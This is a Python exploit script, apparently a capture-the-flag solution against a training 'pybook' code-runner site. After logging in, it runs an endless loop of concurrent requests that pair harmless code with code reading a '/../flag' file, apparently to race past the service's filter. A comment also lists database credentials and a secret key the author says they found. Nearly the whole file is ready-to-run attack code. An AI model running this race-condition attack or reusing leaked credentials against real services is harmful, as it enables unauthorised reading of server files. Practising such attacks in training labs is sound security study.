import random
import string
import time
import requests
from threading import Thread
import sys

#dbpw: pybokko dbusr: pybokko db: pybokko #we found thisisascreketkeysothatstuffworkproperly

#Variables
username = "provaX"
password = username
URL = "http://pybook.training.jinblack.it/"
legit_code='print("ciao")\nprint("ciao2")'
malicious_code="with open('/../flag', 'r') as f: print(f.read())"


def send_legit_code():
    r = session.post(URL+ "run", data=legit_code)
    print(r.text)

def send_malicious_code():
    r = session.post(URL + "run", data=malicious_code)
    print(r.text)


session = requests.session()

#Login
payload = {"username": username, "password" : password}
r = session.post(URL + "login", data=payload)


while True:
    code_thread_malicious = Thread(target=send_legit_code)
    code_thread_legit = Thread(target=send_malicious_code)
    code_thread_legit.start()
    code_thread_malicious.start()
    
    time.sleep(0.2)